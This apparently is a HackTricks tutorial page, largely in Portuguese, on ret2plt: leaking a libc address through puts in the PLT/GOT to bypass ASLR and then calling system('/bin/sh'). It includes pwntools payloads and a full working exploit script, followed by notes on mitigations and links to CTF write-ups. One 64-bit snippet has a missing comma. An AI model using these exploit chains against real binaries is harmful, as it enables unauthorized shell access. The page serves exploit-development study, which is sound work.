# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Informações Básicas

O objetivo desta técnica é **leak um endereço de uma função do PLT** para poder contornar o ASLR. Isto porque, por exemplo, se você leak o endereço da função `puts` do libc, você pode então **calcular onde está a base do `libc`** e calcular offsets para acessar outras funções como **`system`**.

Isto pode ser feito com um payload `pwntools` como ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Note how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset Table). This is because by the time `puts` prints the GOT entry of puts, this **entry will contain the exact address of `puts` in memory**.

Observe também como o endereço de `main` é usado no exploit para que, quando `puts` terminar sua execução, o **binary chame `main` novamente em vez de sair** (assim o endereço leak continuará válido).

> [!CAUTION]
> Observe que, para que isso funcione, o **binary não pode ser compilado com PIE** ou você deve ter **encontrado um leak para bypassar o PIE** para poder saber o endereço do PLT, GOT e main. Caso contrário, você precisa bypassar o PIE primeiro.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). This was the final exploit from that **example**:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Considerações modernas

- **`-fno-plt` builds** (comuns em distros modernas) substituem `call foo@plt` por `call [foo@got]`. Se o binário não tem um stub `foo@plt`, você ainda pode leak o endereço resolvido com `puts(elf.got['foo'])` e então **retornar diretamente para a entrada GOT** (`flat(padding, elf.got['foo'])`) para saltar para libc assim que o lazy binding for concluído.
- **Full RELRO / `-Wl,-z,now`**: GOT é somente‑leitura mas ret2plt ainda funciona para leaks porque você apenas lê a slot do GOT. Se o símbolo nunca foi chamado, seu primeiro ret2plt também realizará o lazy binding e então imprimirá o slot resolvido.
- **ASLR + PIE**: se o PIE estiver habilitado, primeiro leak um ponteiro de código (por exemplo, endereço de retorno salvo, ponteiro de função, ou entrada `.plt` via outro format‑string/infoleak) para calcular a base do PIE, então construa a cadeia ret2plt com os endereços PLT/GOT rebased.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries são válidos BTI landing pads (`bti c`), então ao explorar binários com BTI habilitado prefira saltar para o stub PLT (ou outro gadget anotado com BTI) em vez de ir diretamente para um gadget libc sem BTI, caso contrário a CPU acionará falhas `BRK`/`PAC`.
- **Quick resolution helper**: se a função alvo ainda não estiver resolvida e você precisar de um leak em uma única tentativa, encadeie a chamada PLT duas vezes: primeiro `elf.plt['foo']` (para resolver) e depois novamente `elf.plt['foo']` com o endereço GOT como argumento para imprimir o slot agora preenchido.

## Outros exemplos & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bits, ASLR habilitado, mas sem PIE: o primeiro passo é preencher o overflow até o byte 0x00 do canary para então chamar puts e realizar o leak dele. Com o canary, cria‑se um gadget ROP para chamar puts e realizar o leak do endereço de puts do GOT e então um gadget ROP para chamar `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR habilitado, sem canary, overflow de stack em main vindo de uma função filha. Gadget ROP para chamar puts e realizar o leak do endereço de puts do GOT e então chamar um one gadget.

## Referências

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
